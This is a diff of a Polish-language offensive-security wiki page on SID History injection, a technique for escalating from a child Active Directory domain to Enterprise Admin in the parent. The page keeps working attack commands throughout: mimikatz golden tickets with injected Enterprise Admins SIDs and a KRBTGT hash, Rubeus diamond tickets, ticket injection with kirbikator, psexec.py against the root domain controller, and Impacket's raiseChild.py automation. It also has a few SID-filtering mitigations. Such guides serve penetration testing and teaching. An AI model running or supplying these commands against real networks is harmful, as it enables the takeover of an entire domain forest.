@@ -4,7 +4,7 @@
 
 ## Atak wstrzykiwania historii SID
 
-Celem **ataku wstrzykiwania historii SID** jest wspieranie **migracji użytkowników między domenami** przy jednoczesnym zapewnieniu dostępu do zasobów z poprzedniej domeny. Osiąga się to poprzez **włączenie poprzedniego identyfikatora zabezpieczeń (SID) użytkownika do historii SID** jego nowe konto. Co ważne, proces ten można zmanipulować, aby przyznać nieautoryzowany dostęp, dodając SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny macierzystej do historii SID. To wykorzystanie przyznaje dostęp do wszystkich zasobów w domenie macierzystej.
+Skupienie się na **ataku wstrzykiwania historii SID** polega na wspieraniu **migracji użytkowników między domenami**, zapewniając jednocześnie ciągły dostęp do zasobów z poprzedniej domeny. Osiąga się to poprzez **włączenie poprzedniego identyfikatora zabezpieczeń (SID) użytkownika do historii SID** jego nowe konto. Co ważne, proces ten można zmanipulować, aby przyznać nieautoryzowany dostęp, dodając SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny macierzystej do historii SID. To wykorzystanie przyznaje dostęp do wszystkich zasobów w domenie macierzystej.
 
 Istnieją dwie metody wykonania tego ataku: poprzez stworzenie **Złotego Biletu** lub **Diamentowego Biletu**.
 
@@ -21,12 +21,12 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 
 Zgodnie z [**dokumentacją**](https://technet.microsoft.com/library/cc835085.aspx):
 - **Wyłączenie SIDHistory w zaufaniach lasów** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no na kontrolerze domeny`)
-- **Zastosowanie kwarantanny filtrów SID do zaufania zewnętrznych** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes na kontrolerze domeny`)
-- **Zastosowanie filtrowania SID do zaufania domen w obrębie jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować zmiany łamiące. Jeśli domena w lesie jest niegodna zaufania, nie powinna być członkiem lasu. W tej sytuacji konieczne jest najpierw podzielenie zaufanych i niegodnych zaufania domen na oddzielne lasy, gdzie można zastosować filtrowanie SID do zaufania między lasami.
+- **Zastosowanie kwarantanny filtrów SID do zaufanych zewnętrznych** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes na kontrolerze domeny`)
+- **Zastosowanie filtrowania SID do zaufanych domen w obrębie jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować zmiany łamiące. Jeśli domena w lesie jest niegodna zaufania, nie powinna być członkiem lasu. W tej sytuacji konieczne jest najpierw podzielenie zaufanych i niegodnych zaufania domen na oddzielne lasy, gdzie można zastosować filtrowanie SID do zaufania między lasami.
 
 Sprawdź ten post, aby uzyskać więcej informacji na temat obejścia tego: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
+### Bilet Diamentowy (Rubeus + KRBTGT-AES256)
 
 Ostatnim razem, gdy to próbowałem, musiałem dodać argument **`/ldap`**.
 ```bash
@@ -63,12 +63,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 Aby uzyskać więcej informacji na temat złotych biletów, sprawdź:
 
+
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
 Aby uzyskać więcej informacji na temat diamentowych biletów, sprawdź:
+
 
 {{#ref}}
 diamond-ticket.md
@@ -78,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Zwiększ uprawnienia do DA roota lub administratora Enterprise, używając hasha KRBTGT skompromitowanej domeny:
+Zwiększ uprawnienia do DA roota lub administratora przedsiębiorstwa, używając hasha KRBTGT skompromitowanej domeny:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -118,11 +120,11 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatycznie przy użyciu [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatycznie za pomocą [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 To jest skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:
 
-- Docelowego kontrolera domeny
+- Kontrolera domeny docelowej
 - Poświadczeń dla użytkownika administratora w domenie podrzędnej
 
 Przebieg jest następujący:
@@ -131,8 +133,8 @@ Przebieg jest następujący:
 - Pobiera hash konta KRBTGT w domenie podrzędnej
 - Tworzy Złoty Bilet
 - Loguje się do domeny nadrzędnej
-- Pobiera poświadczenia dla konta Administrator w domenie nadrzędnej
-- Jeśli przełącznik `target-exec` jest określony, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
+- Pobiera poświadczenia dla konta Administratora w domenie nadrzędnej
+- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do Kontrolera Domeny domeny nadrzędnej za pomocą Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
